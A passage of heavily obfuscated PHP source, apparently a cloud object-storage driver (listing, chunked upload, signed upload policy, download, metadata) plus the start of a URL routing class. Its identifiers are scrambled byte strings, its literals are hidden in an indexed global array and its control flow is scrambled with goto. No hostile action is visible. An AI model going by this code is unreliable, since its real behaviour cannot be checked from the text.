$this->getPathOuter($Bƒ·ÁÖ½„[8] . $DŒÇ¾é½ÊÒ), $Bƒ·ÁÖ½„[29] => $Bƒ·ÁÖ½„[163], $Bƒ·ÁÖ½„[77] => isset($E™áÒœ÷Œø[$Bƒ·ÁÖ½„[321]]) ? $E™áÒœ÷Œø[$Bƒ·ÁÖ½„[321]] : 0, $Bƒ·ÁÖ½„[156] => $this->ext($DŒÇ¾é½ÊÒ)); } $D¬ÍœÊµõ½ = array($Bƒ·ÁÖ½„[28] => $this->pathThis($DŒÇ¾é½ÊÒ), $Bƒ·ÁÖ½„[75] => $this->getPathOuter($Bƒ·ÁÖ½„[8] . $DŒÇ¾é½ÊÒ), $Bƒ·ÁÖ½„[29] => $Bƒ·ÁÖ½„[163], $Bƒ·ÁÖ½„[183] => 0, $Bƒ·ÁÖ½„[106] => isset($cõÎ¦°ÜÂÉ[$Bƒ·ÁÖ½„[1240]]) ? $cõÎ¦°ÜÂÉ[$Bƒ·ÁÖ½„[1240]] : 0, $Bƒ·ÁÖ½„[77] => isset($E™áÒœ÷Œø[$Bƒ·ÁÖ½„[321]]) ? $E™áÒœ÷Œø[$Bƒ·ÁÖ½„[321]] : 0, $Bƒ·ÁÖ½„[156] => $this->ext($DŒÇ¾é½ÊÒ), $Bƒ·ÁÖ½„[184] => !0, $Bƒ·ÁÖ½„[185] => !0); if (empty($E™áÒœ÷Œø)) { $E™áÒœ÷Œø = $this->objectMeta($DŒÇ¾é½ÊÒ); if (!$E™áÒœ÷Œø) { return $D¬ÍœÊµõ½; } $D¬ÍœÊµõ½[$Bƒ·ÁÖ½„[183]] = $E™áÒœ÷Œø[$Bƒ·ÁÖ½„[1241]]; $D¬ÍœÊµõ½[$Bƒ·ÁÖ½„[106]] = $E™áÒœ÷Œø[$Bƒ·ÁÖ½„[1242]]; $D¬ÍœÊµõ½[$Bƒ·ÁÖ½„[77]] = $E™áÒœ÷Œø[$Bƒ·ÁÖ½„[77]]; } return $D¬ÍœÊµõ½; } public function folderInfo($c°ÄÕ„Àà², $C­Á¡™½Ø× = false) { $fä…îğ½äÖ =& $_SERVER[Ìó]; if ($C­Á¡™½Ø×) { return array($fä…îğ½äÖ[28] => $this->pathThis($c°ÄÕ„Àà²), $fä…îğ½äÖ[75] => $this->getPathOuter($fä…îğ½äÖ[8] . $c°ÄÕ„Àà²), $fä…îğ½äÖ[29] => $fä…îğ½äÖ[76]); } $AĞ«ßİŞÂ‡ = array($fä…îğ½äÖ[28] => $this->pathThis($c°ÄÕ„Àà²), $fä…îğ½äÖ[75] => $this->getPathOuter($fä…îğ½äÖ[8] . $c°ÄÕ„Àà²), $fä…îğ½äÖ[29] => $fä…îğ½äÖ[76], $fä…îğ½äÖ[183] => 0, $fä…îğ½äÖ[106] => isset($Cˆ©Ñ«ÙÚê[$fä…îğ½äÖ[1240]]) ? $Cˆ©Ñ«ÙÚê[$fä…îğ½äÖ[1240]] : 0, $fä…îğ½äÖ[1150] => !0, $fä…îğ½äÖ[1151] => !0); if (empty($aÕ¢“×»¯)) { $aÕ¢“×»¯ = $this->objectMeta($c°ÄÕ„Àà²); if (!$aÕ¢“×»¯) { return $AĞ«ßİŞÂ‡; } $AĞ«ßİŞÂ‡[$fä…îğ½äÖ[183]] = $aÕ¢“×»¯[$fä…îğ½äÖ[1241]]; $AĞ«ßİŞÂ‡[$fä…îğ½äÖ[106]] = $aÕ¢“×»¯[$fä…îğ½äÖ[1242]]; } return $AĞ«ßİŞÂ‡; } private function fileList($f‹Şçƒù¥á, $A‹×Ì†Œ´ = 0, $aƒ³àõÌµ = 1000) { $a’¼‘ôÏµ» =& $_SERVER[Ìó]; $f¥ê£…ŠÎ = array($a’¼‘ôÏµ»[1243], $a’¼‘ôÏµ»[1244] . $aƒ³àõÌµ); if ($A‹×Ì†Œ´) { $f¥ê£…ŠÎ[] = $a’¼‘ôÏµ»[1245] . $A‹×Ì†Œ´; } $FÜƒí·Î§ = $this->ussRequest($f‹Şçƒù¥á, $a’¼‘ôÏµ»[212], !1, $f¥ê£…ŠÎ); return !$FÜƒí·Î§[$a’¼‘ôÏµ»[1028]] ? !1 : $FÜƒí·Î§[$a’¼‘ôÏµ»[1030]]; } public function listPath($bÓøõáÆ£, $Fİ«£¥ŒÀ = false) { goto bâŞÖÃ¢; bâŞÖÃ¢: $A–²³ö“áÏ =& $_SERVER[Ìó]; $E‹»Ä´©ë† = $A–²³ö“áÏ[33]; $F•‘˜ªİä = 1000; goto bŞ¦¢à²›‹; bŞ¦¢à²›‹: $F¹‚µ¶¬ëó = $dÀ¢ŞÂùÀ´ = array(); $BœËî°ùõ‡ = rtrim($bÓøõáÆ£, $A–²³ö“áÏ[8]) . $A–²³ö“áÏ[8]; while (!0) { $BÔ…·ïĞ = $this->fileList($bÓøõáÆ£, $E‹»Ä´©ë†, $F•‘˜ªİä); if (!$BÔ…·ïĞ) { return !1; } $E‹»Ä´©ë† = isset($BÔ…·ïĞ[$A–²³ö“áÏ[1246]]) ? $BÔ…·ïĞ[$A–²³ö“áÏ[1246]] : $A–²³ö“áÏ[33]; $dï·‹Îº³ = isset($BÔ…·ïĞ[$A–²³ö“áÏ[1247]]) ? $BÔ…·ïĞ[$A–²³ö“áÏ[1247]] : array(); foreach ($dï·‹Îº³ as $E‘ÅóÑ´•) { if ($E‘ÅóÑ´•[$A–²³ö“áÏ[29]] == $A–²³ö“áÏ[76]) { $F¹‚µ¶¬ëó[] = $this->folderInfo($BœËî°ùõ‡ . $E‘ÅóÑ´•[$A–²³ö“áÏ[28]], $Fİ«£¥ŒÀ, $E‘ÅóÑ´•); } else { $dÀ¢ŞÂùÀ´[] = $this->fileInfo($BœËî°ùõ‡ . $E‘ÅóÑ´•[$A–²³ö“áÏ[28]], $Fİ«£¥ŒÀ, $E‘ÅóÑ´•); } } if (count($dï·‹Îº³) < $F•‘˜ªİä) { break; } } goto BˆÙÎòÚ§Ø; BˆÙÎòÚ§Ø: return array($A–²³ö“áÏ[74] => $F¹‚µ¶¬ëó, $A–²³ö“áÏ[73] => $dÀ¢ŞÂùÀ´); goto aØ¶ä×„à¬; aØ¶ä×„à¬: } private function recursionAllFiles($f…áÙ«èœ, &$BŸ¨¹É–îâ) { $EÛÈ¼Ç‘ƒ =& $_SERVER[Ìó]; $cËĞ·˜ƒ†× = $EÛÈ¼Ç‘ƒ[33]; $Fè›¶ãà°Ó = 1000; $e‘œ‡ª°Ì = $FÖÕéÇ÷°Ø = array(); $cƒæÓŠ„­ = rtrim($f…áÙ«èœ, $EÛÈ¼Ç‘ƒ[8]) . $EÛÈ¼Ç‘ƒ[8]; while (!0) { $b…•èÚŒ¨Ş = $this->fileList($f…áÙ«èœ, $cËĞ·˜ƒ†×, $Fè›¶ãà°Ó); if (!$b…•èÚŒ¨Ş) { return !1; } $cËĞ·˜ƒ†× = isset($b…•èÚŒ¨Ş[$EÛÈ¼Ç‘ƒ[1246]]) ? $b…•èÚŒ¨Ş[$EÛÈ¼Ç‘ƒ[1246]] : $EÛÈ¼Ç‘ƒ[33]; $FƒóÚæ£ = isset($b…•èÚŒ¨Ş[$EÛÈ¼Ç‘ƒ[1247]]) ? $b…•èÚŒ¨Ş[$EÛÈ¼Ç‘ƒ[1247]] : array(); foreach ($FƒóÚæ£ as $dºåëÍŒŠÇ) { $F“Ñ­‘îˆÚ = array($EÛÈ¼Ç‘ƒ[75] => $cƒæÓŠ„­ . $dºåëÍŒŠÇ[$EÛÈ¼Ç‘ƒ[28]], $EÛÈ¼Ç‘ƒ[76] => $dºåëÍŒŠÇ[$EÛÈ¼Ç‘ƒ[29]] == $EÛÈ¼Ç‘ƒ[76] ? 1 : 0, $EÛÈ¼Ç‘ƒ[77] => isset($dºåëÍŒŠÇ[$EÛÈ¼Ç‘ƒ[321]]) ? $dºåëÍŒŠÇ[$EÛÈ¼Ç‘ƒ[321]] : 0); $BŸ¨¹É–îâ[] = $F“Ñ­‘îˆÚ; if ($F“Ñ­‘îˆÚ[$EÛÈ¼Ç‘ƒ[76]] == 1) { $this->recursionAllFiles($F“Ñ­‘îˆÚ[$EÛÈ¼Ç‘ƒ[75]], $BŸ¨¹É–îâ); } } if (count($FƒóÚæ£) < $Fè›¶ãà°Ó) { break; } } } public function has($DÃã¸¼¬µÁ, $aì‚Ï¹®— = false, $FÔ–Ôëõ‘ = true) { goto Eà‰†éµ‚Ï; aôšğ¤š£Ã: $DŒ²¶ƒ‰×† = 0; $f­³¿Ñ©‹¬ = 0; $c¦Ï¢ê½ö£ = rtrim($DÃã¸¼¬µÁ, $cÆ¢ùÏ§Ää[8]) . $cÆ¢ùÏ§Ää[8]; goto dª¨Úµáµ§; dª¨Úµáµ§: while (!0) { $CŒ¼¨Ûˆµ = $this->fileList($DÃã¸¼¬µÁ, $B³õ‰ë«ò—, $B´°Í¸‡«‘); if (!$CŒ¼¨Ûˆµ) { return !1; } $B³õ‰ë«ò— = isset($CŒ¼¨Ûˆµ[$cÆ¢ùÏ§Ää[1246]]) ? $CŒ¼¨Ûˆµ[$cÆ¢ùÏ§Ää[1246]] : $cÆ¢ùÏ§Ää[33]; $Aƒ¡Ëš‡òá = isset($CŒ¼¨Ûˆµ[$cÆ¢ùÏ§Ää[1247]]) ? $CŒ¼¨Ûˆµ[$cÆ¢ùÏ§Ää[1247]] : array(); if (empty($Aƒ¡Ëš‡òá)) { break; } $e·İ°Ş‘Àˆ = array_to_keyvalue($Aƒ¡Ëš‡òá, $cÆ¢ùÏ§Ää[33], $cÆ¢ùÏ§Ää[29]); $AµŒ³åé¢¾ = array_count_values($e·İ°Ş‘Àˆ); $fß½ƒ‘¸ñ = isset($AµŒ³åé¢¾[$cÆ¢ùÏ§Ää[76]]) ? $AµŒ³åé¢¾[$cÆ¢ùÏ§Ää[76]] : 0; $f©ÇëØ™Ò = count($e·İ°Ş‘Àˆ) - $fß½ƒ‘¸ñ; if ($aì‚Ï¹®—) { $f­³¿Ñ©‹¬ += $fß½ƒ‘¸ñ; $DŒ²¶ƒ‰×† += $f©ÇëØ™Ò; if ($Fî¶Ä‡ÜÂâ < $B´°Í¸‡«‘) { break; } continue; } if ($FÔ–Ôëõ‘) { if ($f©ÇëØ™Ò) { return !0; } } else { if ($fß½ƒ‘¸ñ) { return !0; } } if (count($Aƒ¡Ëš‡òá) < $B´°Í¸‡«‘) { break; } } if ($aì‚Ï¹®—) { return array($cÆ¢ùÏ§Ää[187] => $DŒ²¶ƒ‰×†, $cÆ¢ùÏ§Ää[188] => $f­³¿Ñ©‹¬); } return !1; goto CÈĞ¡óØ†‘; Eà‰†éµ‚Ï: $cÆ¢ùÏ§Ää =& $_SERVER[Ìó]; $B³õ‰ë«ò— = $cÆ¢ùÏ§Ää[33]; $B´°Í¸‡«‘ = 1000; goto aôšğ¤š£Ã; CÈĞ¡óØ†‘: } public function listAll($C‚ñ’ƒ‰…») { $c¶†ÂŠÀÃ = array(); $this->recursionAllFiles($C‚ñ’ƒ‰…», $c¶†ÂŠÀÃ); return $c¶†ÂŠÀÃ; } public function canRead($A·ÍÎ¼À¡ä) { return $this->exist($A·ÍÎ¼À¡ä) ? !0 : !1; } public function canWrite($BôÇ¼ßä) { return $this->exist($BôÇ¼ßä) ? !0 : !1; } public function getContent($Bó“„ÜÅÅ) { return $this->fileSubstr($Bó“„ÜÅÅ, 0, -1); } public function setContent($FºöÀ–¥è, $C‚´­½ù¤ = '') { $c‹å¹äëĞª =& $_SERVER[Ìó]; if (!$C‚´­½ù¤) { $aù‰ß˜á´í = $this->ussRequest($FºöÀ–¥è, $c‹å¹äëĞª[208]); return $aù‰ß˜á´í[$c‹å¹äëĞª[1028]]; } $D×„ÏÅ³Æë = $this->tempFile($this->pathThis($FºöÀ–¥è)); file_put_contents($D×„ÏÅ³Æë, $C‚´­½ù¤); if ($this->upload($FºöÀ–¥è, $D×„ÏÅ³Æë)) { $this->tempFileRemve($D×„ÏÅ³Æë); return !0; } return !1; } public function fileSubstr($Eì¹ŞÍÌ°å, $a´’ÆİÈĞ¡, $FƒæÁ§´Ù“) { $cÚÈŠ…ÎË =& $_SERVER[Ìó]; if (!($dÂ…“¯Ïõˆ = $this->link($Eì¹ŞÍÌ°å))) { return !1; } $e¾ÂÁ‡‚¼ = !1; if ($FƒæÁ§´Ù“ > 0) { $B’Úİ¹Š = $a´’ÆİÈĞ¡ + $FƒæÁ§´Ù“ - 1; $e¾ÂÁ‡‚¼ = array($cÚÈŠ…ÎË[1208] . $a´’ÆİÈĞ¡ . $cÚÈŠ…ÎË[407] . $B’Úİ¹Š); } $cİ¾¶Ê•Ä³ = url_request($dÂ…“¯Ïõˆ, $cÚÈŠ…ÎË[212], !1, $e¾ÂÁ‡‚¼); return $cİ¾¶Ê•Ä³[$cÚÈŠ…ÎË[685]] ? $cİ¾¶Ê•Ä³[$cÚÈŠ…ÎË[1030]] : !1; } public function upload($AÇèÆ¹ï±ˆ, $FßµÌÁ‹‡, $CÒ§”‚É¥Ö = false, $aŞøù¾©×  = REPEAT_REPLACE) { goto f®Õ³‘é³º; b·àòêò‘: do { $Bø³˜­Šßê = $fºÀÁœš³[$eƒ¤èŒÆõ™[1254]]; fseek($AáÈ´ÇŠƒÇ, $C¼”çğ÷ÊÑ); $EšŒ–šÌ†ì = fread($AáÈ´ÇŠƒÇ, $Bø³˜­Šßê); $b×ä“É·ä³ = 0; do { $b×ä“É·ä³++; $fºÀÁœš³ = $this->uploadPart($AÇèÆ¹ï±ˆ, $fºÀÁœš³, $EšŒ–šÌ†ì); } while (!$fºÀÁœš³ && $b×ä“É·ä³ < 3); if (!$fºÀÁœš³) { return !1; } $EÒĞ›µŠØ = $fºÀÁœš³[$eƒ¤èŒÆõ™[1253]]; $C¼”çğ÷ÊÑ += $Bø³˜­Šßê; } while ($EÒĞ›µŠØ != -1); fclose($AáÈ´ÇŠƒÇ); $C»¬¼£šÑ‹ = array($eƒ¤èŒÆõ™[1255], $eƒ¤èŒÆõ™[1256] . $fºÀÁœš³[$eƒ¤èŒÆõ™[1257]], $eƒ¤èŒÆõ™[1251]); goto d¤†œÜ¯©; f®Õ³‘é³º: $eƒ¤èŒÆõ™ =& $_SERVER[Ìó]; $e·¢Å“¶‡ = IO::size($FßµÌÁ‹‡); if ($e·¢Å“¶‡ <= 1024 * 1024 * 200) { $Eæ„¥’÷… = array($eƒ¤èŒÆõ™[1248] . $FßµÌÁ‹‡); $a¹‡‚Æ§ = $this->ussRequest($AÇèÆ¹ï±ˆ, $eƒ¤èŒÆõ™[210], $Eæ„¥’÷…); return $a¹‡‚Æ§[$eƒ¤èŒÆõ™[1028]] ? $this->getPathOuter($AÇèÆ¹ï±ˆ) : !1; } goto aŒ×ßá¡ÇÇ; aŒ×ßá¡ÇÇ: $F’ÒÇéø±ø = 1024 * 1024 * 10; $C»¬¼£šÑ‹ = array($eƒ¤èŒÆõ™[1249], $eƒ¤èŒÆõ™[1250] . $e·¢Å“¶‡, $eƒ¤èŒÆõ™[1251], $eƒ¤èŒÆõ™[1252] . $F’ÒÇéø±ø); $a¹‡‚Æ§ = $this->ussRequest($AÇèÆ¹ï±ˆ, $eƒ¤èŒÆõ™[210], !1, $C»¬¼£šÑ‹); goto aù¸ÎÔ˜; d¤†œÜ¯©: $a¹‡‚Æ§ = $this->ussRequest($AÇèÆ¹ï±ˆ, $eƒ¤èŒÆõ™[210], !1, $C»¬¼£šÑ‹); return $a¹‡‚Æ§[$eƒ¤èŒÆõ™[1028]] ? $this->getPathOuter($dÜ¤Ì†æ˜”) : !1; goto cÛÚŠÉ‘Şİ; aù¸ÎÔ˜: if (!$a¹‡‚Æ§[$eƒ¤èŒÆõ™[1028]]) { return !1; } $fºÀÁœš³ = $a¹‡‚Æ§[$eƒ¤èŒÆõ™[1030]]; $C¼”çğ÷ÊÑ = 0; goto F×¯š…æ–; F×¯š…æ–: $EÒĞ›µŠØ = $fºÀÁœš³[$eƒ¤èŒÆõ™[1253]]; $AáÈ´ÇŠƒÇ = fopen($FßµÌÁ‹‡, $eƒ¤èŒÆõ™[1158]); if (!$AáÈ´ÇŠƒÇ) { return !1; } goto b·àòêò‘; cÛÚŠÉ‘Şİ: } private function uploadPart($b¬Áğ…‡¨Ê, $b«·ˆ±İË, &$bÁ°ğµ‰) { $B´öÄÊ‰‚ =& $_SERVER[Ìó]; $D†ÛÁ©¡šÉ = array($B´öÄÊ‰‚[1258], $B´öÄÊ‰‚[1256] . $b«·ˆ±İË[$B´öÄÊ‰‚[1257]], $B´öÄÊ‰‚[1259] . $b«·ˆ±İË[$B´öÄÊ‰‚[1253]], $B´öÄÊ‰‚[1260] . $b«·ˆ±İË[$B´öÄÊ‰‚[1254]]); $DùïÁìò…Œ = $this->ussRequest($b¬Áğ…‡¨Ê, $B´öÄÊ‰‚[210], $bÁ°ğµ‰, $D†ÛÁ©¡šÉ); return !$DùïÁìò…Œ[$B´öÄÊ‰‚[1028]] ? $DùïÁìò…Œ[$B´öÄÊ‰‚[1028]] : $DùïÁìò…Œ[$B´öÄÊ‰‚[1030]]; } public function uploadFormData($Aëï…ù¤Š, $fØè¥’îÄå = 3600) { return $this->uploadPolicy($Aëï…ù¤Š, $fØè¥’îÄå); } public function multiUploadFormData($e¢ÓÜ¹ ’, $F«È®Šš = 3600) { $d—ÏˆŸÅòö =& $_SERVER[Ìó]; $f îÍâ´êÚ = (int) $GLOBALS[$d—ÏˆŸÅòö[7]][$d—ÏˆŸÅòö[77]]; return $this->uploadPolicy($e¢ÓÜ¹ ’, $F«È®Šš, $f îÍâ´êÚ); } private function uploadPolicy($F‚ñ´¥‰ƒ, $B²¾©ÆÌÆœ = 3600, $D¶¥§ƒŒ = 0) { goto CÊ’Í¿êÀ; E¤ØóÑÌƒç: $b½ãÓ”‚’œ = array($E•æ™®«™Ä[1261] => $this->bucket, $E•æ™®«™Ä[1262] => $F‚ñ´¥‰ƒ, $E•æ™®«™Ä[1263] => time() + $B²¾©ÆÌÆœ, $E•æ™®«™Ä[1264] => $aÉÎñÔá°†); if ($D¶¥§ƒŒ) { $b½ãÓ”‚’œ[$E•æ™®«™Ä[1179]] = $D¶¥§ƒŒ; } $f•½²¬Ó° = base64_encode(json_encode($b½ãÓ”‚’œ)); goto Bä¼ÑĞíŸÎ; CÊ’Í¿êÀ: $E•æ™®«™Ä =& $_SERVER[Ìó]; $cİÏâ¥Ùõ = $E•æ™®«™Ä[8] . $this->bucket; $aÉÎñÔá°† = gmdate($E•æ™®«™Ä[1193]); goto E¤ØóÑÌƒç; Bä¼ÑĞíŸÎ: $bšœÔÌ²“Š = base64_encode(hash_hmac($E•æ™®«™Ä[1230], "\x50\x4f\x53\124\x26{$cİÏâ¥Ùõ}\x26{$aÉÎñÔá°†}\46{$f•½²¬Ó°}", md5("{$this->userpass}"), !0)); $Eìì–š’¹› = array($E•æ™®«™Ä[1101] => $f•½²¬Ó°, $E•æ™®«™Ä[1265] => "\125\120\x59\x55\116\x20{$this->username}\x3a{$bšœÔÌ²“Š}", $E•æ™®«™Ä[165] => $this->endpoint . $cİÏâ¥Ùõ); return $Eìì–š’¹›; goto f¦ŠñùÃÓö; f¦ŠñùÃÓö: } public function download($CÄš½İ§Ã¤, $B¡¬ğĞÖğ§) { goto BÅ‰§Çñ§; bˆƒáò»ğï: fclose($a¸Û¥Ò¶¥—); return $B¡¬ğĞÖğ§; goto DÄ÷™¸½Ğ; E¿˜…ŒÙ§ª: $F¶£æİÏ½¼ = 1024 * 200; $a¸Û¥Ò¶¥— = fopen($EŠì¡¡³¥®, $_SERVER[Ìó][1214]); while (!0) { $D§ŒÇ§¶¸» = $this->fileSubstr($CÄš½İ§Ã¤, $e‘ƒœŠÃäé, $F¶£æİÏ½¼); if ($D§ŒÇ§¶¸» === !1) { return !1; } fwrite($a¸Û¥Ò¶¥—, $D§ŒÇ§¶¸»); $e‘ƒœŠÃäé += $F¶£æİÏ½¼; if (strlen($D§ŒÇ§¶¸») < $F¶£æİÏ½¼) { break; } } goto bˆƒáò»ğï; BÅ‰§Çñ§: $EŠì¡¡³¥® = IO::getPathInner(IO::mkfile($B¡¬ğĞÖğ§)); if (!($føªå¨ÏïÔ = $this->link($CÄš½İ§Ã¤))) { return !1; } $e‘ƒœŠÃäé = 0; goto E¿˜…ŒÙ§ª; DÄ÷™¸½Ğ: } public function link($dë«Åù‘¯, $b•‰ò°Ş‘ = array()) { $bÌ¡Òäñæ— =& $_SERVER[Ìó]; $dë«Åù‘¯ = trim($dë«Åù‘¯, $bÌ¡Òäñæ—[8]); if (!empty($this->token)) { $fÂ•³¡öïà = strtotime(date($bÌ¡Òäñæ—[1266])); $e¦¿Ê–²©² = substr(md5($this->token . $bÌ¡Òäñæ—[268] . $fÂ•³¡öïà . $bÌ¡Òäñæ—[1267] . $dë«Åù‘¯), 12, 8) . $fÂ•³¡öïà; $b•‰ò°Ş‘[] = $bÌ¡Òäñæ—[1268] . $e¦¿Ê–²©²; } $eŒ»ìó¬´ò = !empty($b•‰ò°Ş‘) ? $bÌ¡Òäñæ—[69] . implode($bÌ¡Òäñæ—[268], $b•‰ò°Ş‘) : $bÌ¡Òäñæ—[33]; return $this->getHost() . $bÌ¡Òäñæ—[8] . $dë«Åù‘¯ . $eŒ»ìó¬´ò; } public function fileOut($FéÖ›ÈÅ†, $FÂ¥‰¬º¡ = false, $F•ˆÛ›ó•å = false, $f²µÔò”¯ = '') { if (!$F•ˆÛ›ó•å) { $F•ˆÛ›ó•å = $this->pathThis($FéÖ›ÈÅ†); } $a£Àñ„ç¥ = $FÂ¥‰¬º¡ ? array($_SERVER[Ìó][1269] . rawurlencode($F•ˆÛ›ó•å)) : array(); $a‚§¦Œ° = $this->link($FéÖ›ÈÅ†, $a£Àñ„ç¥); $this->fileOutLink($a‚§¦Œ°); } public function fileOutServer($EŠÊ…ÚƒÔ, $Bª§‡‡¬ = false, $CíÇÒ¿„˜ï = false, $fëóøŞ’‘÷ = '') { parent::fileOut($EŠÊ…ÚƒÔ, $Bª§‡‡¬, $CíÇÒ¿„˜ï, $fëóøŞ’‘÷); } public function fileOutImage($Aì¬Ë™šŒ, $FÔª…œæ» = 250) { $C×’¹•±è = $this->link($Aì¬Ë™šŒ . $_SERVER[Ìó][1270] . $FÔª…œæ»); $this->fileOutLink($C×’¹•±è); } public function fileOutImageServer($C×âªè¤¾, $cùñùš‰Û = 250) { parent::fileOutImage($C×âªè¤¾, $cùñùš‰Û); } public function hashMd5($DÂæëà¾óï) { $D–Šïòùï =& $_SERVER[Ìó]; $aŒ‰‰ğ÷Ï = $this->objectMeta($DÂæëà¾óï); return isset($aŒ‰‰ğ÷Ï[$D–Šïòùï[192]]) ? $aŒ‰‰ğ÷Ï[$D–Šïòùï[192]] : !1; } public function size($E”ÚÛÒï¶Ö) { $bŒ¢Œ„Ê¹ = $this->objectMeta($E”ÚÛÒï¶Ö); return $bŒ¢Œ„Ê¹ ? $bŒ¢Œ„Ê¹[$_SERVER[Ìó][77]] : 0; } public function info($CÓç¸ö²ìó) { if ($this->isFolder($CÓç¸ö²ìó)) { return $this->folderInfo($CÓç¸ö²ìó); } else { if ($this->isFile($CÓç¸ö²ìó)) { return $this->fileInfo($CÓç¸ö²ìó); } } return !1; } public function exist($a˜ç°¡ƒİ) { return $this->isFile($a˜ç°¡ƒİ) || $this->isFolder($a˜ç°¡ƒİ); } public function isFile($F¿ñìŠ±ÅÛ) { return !$this->isFolder($F¿ñìŠ±ÅÛ) && $this->objectMeta($F¿ñìŠ±ÅÛ); } public function isFolder($CÚëç­ßÌ) { return $this->cacheMethod($_SERVER[Ìó][219], $CÚëç­ßÌ); } protected function objectMeta($BÇÇ–œ«ŠÄ) { return $this->cacheMethod($_SERVER[Ìó][220], $BÇÇ–œ«ŠÄ); } protected function _objectMeta($c•œ¤Õ…»„) { goto dŒ¬İÁ²ö; Eè£âœ¹²‘: $BÇÄ¦œ…İ« = array($C„ôÂ×º÷¹[28] => get_path_this($c•œ¤Õ…»„), $C„ôÂ×º÷¹[29] => isset($B‡ãŠÛ”[$C„ôÂ×º÷¹[1272]]) ? $B‡ãŠÛ”[$C„ôÂ×º÷¹[1272]] : null, $C„ôÂ×º÷¹[77] => isset($B‡ãŠÛ”[$C„ôÂ×º÷¹[1273]]) ? $B‡ãŠÛ”[$C„ôÂ×º÷¹[1273]] : null, $C„ôÂ×º÷¹[192] => isset($B‡ãŠÛ”[$C„ôÂ×º÷¹[1274]]) ? $B‡ãŠÛ”[$C„ôÂ×º÷¹[1274]] : null, $C„ôÂ×º÷¹[1241] => isset($B‡ãŠÛ”[$C„ôÂ×º÷¹[1275]]) ? $B‡ãŠÛ”[$C„ôÂ×º÷¹[1275]] : null); $BÇÄ¦œ…İ«[$C„ôÂ×º÷¹[1242]] = isset($B‡ãŠÛ”[$C„ôÂ×º÷¹[1276]]) ? strtotime($B‡ãŠÛ”[$C„ôÂ×º÷¹[1276]]) : $BÇÄ¦œ…İ«[$C„ôÂ×º÷¹[1241]]; return $BÇÄ¦œ…İ«; goto fĞÅ¶ßªÊÛ; F¾†Í·ÓˆŸ: if (!$EÄÉˆØ®ë´[$C„ôÂ×º÷¹[1028]]) { return null; } $B‡ãŠÛ” = isset($EÄÉˆØ®ë´[$C„ôÂ×º÷¹[1030]]) ? $EÄÉˆØ®ë´[$C„ôÂ×º÷¹[1030]] : array(); if (!isset($B‡ãŠÛ”[$C„ôÂ×º÷¹[1272]])) { return null; } goto Eè£âœ¹²‘; dŒ¬İÁ²ö: $C„ôÂ×º÷¹ =& $_SERVER[Ìó]; if ($c•œ¤Õ…»„ == $C„ôÂ×º÷¹[33] || $c•œ¤Õ…»„ == $C„ôÂ×º÷¹[8]) { return array(); } $EÄÉˆØ®ë´ = $this->ussRequest($c•œ¤Õ…»„, $C„ôÂ×º÷¹[1271]); goto F¾†Í·ÓˆŸ; fĞÅ¶ßªÊÛ: } protected function _isFolder($bÏğˆŒò’Ë) { $F£Çù¿Êâ¬ =& $_SERVER[Ìó]; if ($bÏğˆŒò’Ë == $F£Çù¿Êâ¬[33] || $bÏğˆŒò’Ë == $F£Çù¿Êâ¬[8]) { return !0; } $c®Üœ± ƒ– = $this->objectMeta($bÏğˆŒò’Ë); return isset($c®Üœ± ƒ–[$F£Çù¿Êâ¬[29]]) && $c®Üœ± ƒ–[$F£Çù¿Êâ¬[29]] == $F£Çù¿Êâ¬[76] ? !0 : !1; } } goto AÚ†Ö³‰Ò; c¯ÚÏŠ¸ó­: class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\x61\x6e\x79" => "\133\136\57\x5d\53", "\72\156\165\x6d" => "\x5b\x30\55\71\x5d\53", "\72\141\x6c\154" => "\x2e\52"); public static $errorCallback; public static function __callstatic($fï³¤÷Å·Ä, $C†ºÜÆéÚ”) { $A©‘±«¡ =& $_SERVER[Ìó]; if ($fï³¤÷Å·Ä == $A©‘±«¡[1358]) { $aÔ‰±‡…œÕ = array_map($A©‘±«¡[1359], $C†ºÜÆéÚ”[0]); $F‰›ó”Æ¸ì = strpos($C†ºÜÆéÚ”[1], $A©‘±«¡[8]) === 0 ? $C†ºÜÆéÚ”[1] : $A©‘±«¡[8] . $C†ºÜÆéÚ”[1]; $a§ÜÆä‘´ = $C†ºÜÆéÚ”[2]; } else { $aÔ‰±‡…œÕ = null; $F‰›ó”Æ¸ì = strpos($C†ºÜÆéÚ”[0], $A©‘±«¡[8]) === 0 ? $C†ºÜÆéÚ”[0] : $A©‘±«¡[8] . $C†ºÜÆéÚ”[0]; $a§ÜÆä‘´ = $C†ºÜÆéÚ”[1]; } array_push(self::$maps, $aÔ‰±‡…œÕ); array_push(self::$routes, $F‰›ó”Æ¸ì); array_push(self::$methods, strtoupper($fï³¤÷Å·Ä)); array_push(self::$callbacks, $a§ÜÆä‘´); } public static function error($A¼ß°‰Ë—Å) { self::$errorCallback = $A¼ß°‰Ë—Å; } public static function haltOnMatch($F­ëé–Ğ¾½ = true) { self::$halts = $F­ëé–Ğ¾½; } public static function dispatch() { goto A¡ŒãšìÙ; dØ‚Ö‚Ò«Æ: $C·£õ«•Û = array_keys(static::$patterns); $BŠ×Ó¥ìÅ = array_values(static::$patterns); $b â´ã÷” = !1; goto fÄë·İ‡Šƒ; A¡ŒãšìÙ: $Aí¨…ÛÛš =& $_SERVER[Ìó]; $bìØ‡ƒÛÒ = parse_url($_SERVER[$Aí¨…ÛÛš[1360]], PHP_URL_PATH); $fÒÒİÑ±˜‘ = $_SERVER[$Aí¨…ÛÛš[150]]; goto dØ‚Ö‚Ò«Æ; fÄë·İ‡Šƒ: self::$routes = preg_replace($Aí¨…ÛÛš[1069], $Aí¨…ÛÛš[8], self::$routes); if (in_array($bìØ‡ƒÛÒ, self::$routes)) { $bè’ùÅ©À = array_keys(self::$routes, $bìØ‡ƒÛÒ); foreach ($bè’ùÅ©À as $C…˜£ÍŠ‘¥) { if (self::$methods[$C…˜£ÍŠ‘¥] == $fÒÒİÑ±˜‘ || self::$methods[$C…˜£ÍŠ‘¥] == $Aí¨…ÛÛš[1361] || in_array($fÒÒİÑ±˜‘, self::$maps[$C…˜£ÍŠ‘¥])) { $b â´ã÷” = !0; if (!is_object(self::$callbacks[$C…˜£ÍŠ‘¥])) { $dàÍ÷¦¤Ó· = explode($Aí¨…ÛÛš[8], self::$callbacks[$C…˜£ÍŠ‘¥]); $F›ïœÎÈ§º = end($dàÍ÷¦¤Ó·); $B‰Ùš×²×Í = explode($Aí¨…ÛÛš[1362], $F›ïœÎÈ§º); $F†ì¶™æâ— = new $B‰Ùš×²×Í[0](); $F†ì¶™æâ—->{$B‰Ùš×²×Í[1]}(); if (self::$halts) { return; } } else { 